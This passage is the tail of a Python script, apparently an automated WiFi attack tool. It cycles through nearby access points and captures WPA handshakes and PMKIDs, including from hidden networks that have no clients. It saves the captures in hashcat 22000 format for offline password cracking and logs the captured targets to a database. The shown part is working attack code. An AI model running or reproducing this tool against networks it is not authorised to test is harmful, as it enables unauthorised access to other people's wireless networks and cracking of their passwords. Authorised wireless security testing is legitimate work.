                                    )
                                else:
                                    logging.debug(
                                        "Not marking %s (%s) as captured: hcxpcapngtool did not produce valid .22000 (will retry)",
                                        bssid, essid or "?",
                                    )
                        else:
                            # Valid crackable handshake: keep .cap and .22000, mark as captured
                            try:
                                final_cap.rename(final_name)
                            except OSError:
                                final_name = final_cap
                            # Remove only non-.cap/.pcap/.22000 from this capture
                            for leftover in handshakes_dir.glob(cap_name + "*"):
                                if leftover.suffix.lower() not in (".cap", ".pcap", ".22000"):
                                    try:
                                        leftover.unlink()
                                    except OSError:
                                        pass
                            # Rename .22000 to match final_name (e.g. ESSID_BSSID.cap.22000)
                            expected_22000 = final_name.with_suffix(final_name.suffix + ".22000")
                            if hc_path != expected_22000 and hc_path.exists():
                                try:
                                    hc_path.rename(expected_22000)
                                except OSError:
                                    pass
                                hc_path = expected_22000 if expected_22000.exists() else hc_path
                            logging.info("Hashcat format saved: %s (use: hashcat -m 22000 ...)", hc_path)
                            conn.execute(
                                "INSERT OR REPLACE INTO captured (bssid, essid, handshake_path, created_at) VALUES (?,?,?,?)",
                                (bssid, essid, str(final_name), time.strftime("%Y-%m-%d %H:%M:%S")),
                            )
                            conn.commit()
                            reload_skip_list()
                            logging.info("Stored valid handshake: %s (%s) -> %s", bssid, essid or "?", final_name)
                    else:
                        logging.warning("Handshake verified but cap file not found")
                else:
                    # Clean leftover capture files (.csv, etc.) when no handshake
                    stats["failed"] += 1
                    fail_count[bssid.lower()] = fail_count.get(bssid.lower(), 0) + 1
                    for leftover in handshakes_dir.glob(cap_name + "*"):
                        try:
                            leftover.unlink()
                        except OSError:
                            pass
                    logging.info("No handshake for %s (%s) this round; will retry in next cycle", bssid, essid or "?")

                if args.ap_delay and args.ap_delay > 0:
                    logging.debug("Waiting %ds before moving to next AP to avoid driver issues.", args.ap_delay)
                    time.sleep(args.ap_delay)

            # PMKID capture for hidden networks with no clients: only every 5 cycles
            pmkid_nets: list[dict] = []
            for net in networks:
                bssid = net["bssid"]
                channel = net["channel"]
                essid = net["essid"]
                clients = net["clients"]
                if essid != "hidden_network" or clients:
                    continue
                if not channel:
                    continue
                if bssid.lower() in skip_bssids:
                    continue
                if fail_count.get(bssid.lower(), 0) >= MAX_FAILURES_BEFORE_SKIP:
                    continue
                if target_bssids and bssid.lower() not in target_bssids:
                    continue
                if target_essids and essid not in target_essids:
                    continue
                pmkid_nets.append(net)
            pmkid_interval = 5
            if cycle % pmkid_interval == 0:
                logging.info("PMKID capture (every %d cycles): running this cycle (cycle %d)", pmkid_interval, cycle)
                channel_to_bssids: dict[int, list[str]] = {}
                for net in pmkid_nets:
                    ch = net["channel"]
                    channel_to_bssids.setdefault(ch, []).append(net["bssid"])
                pmkid_timeout = getattr(args, "pmkid_timeout", 15)
                for channel, bssids in channel_to_bssids.items():
                    captured_pairs = try_capture_pmkid_channel(
                        mon_iface, channel, bssids, handshakes_dir,
                        timeout_sec=pmkid_timeout,
                        current_proc_holder=current_proc_holder,
                    )
                    for bssid, pmkid_path in captured_pairs:
                        conn.execute(
                            "INSERT OR REPLACE INTO captured (bssid, essid, handshake_path, created_at) VALUES (?,?,?,?)",
                            (bssid, "PMKID", str(pmkid_path), time.strftime("%Y-%m-%d %H:%M:%S")),
                        )
                        conn.commit()
                        reload_skip_list()
                        stats["success"] += 1
                        stats["attempted"] += 1
                        logging.info("PMKID captured for %s (no client): %s", bssid, pmkid_path)
                    stats["skipped"] += len(bssids) - len(captured_pairs)
                    if not captured_pairs:
                        logging.debug("No PMKID for %d BSSID(s) on channel %s this cycle", len(bssids), channel)
                    if args.ap_delay and args.ap_delay > 0 and len(channel_to_bssids) > 1:
                        time.sleep(args.ap_delay)
            elif pmkid_nets:
                next_run = ((cycle // pmkid_interval) + 1) * pmkid_interval
                logging.info("PMKID capture (every %d cycles): skipping this cycle; next on cycle %d", pmkid_interval, next_run)

            logging.info("Cycle %d done; starting new scan.", cycle)

    finally:
        stats_stop.set()
        if stats_thread is not None:
            stats_thread.join(timeout=2)
        logging.info("Final statistics: %s", format_stats())
        set_managed_mode(mon_iface)
        if nm_was_active:
            logging.info("Restoring NetworkManager...")
            run_cmd(["systemctl", "start", "NetworkManager"], timeout=10)
        try:
            verify_stored_handshakes(conn, handshakes_dir)
        except Exception as e:
            logging.debug("Verify on exit: %s", e)
        try:
            conn.close()
        except Exception:
            pass
        if scan_temp_dir is not None:
            shutil.rmtree(scan_temp_dir, ignore_errors=True)
        logging.info("Exiting.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
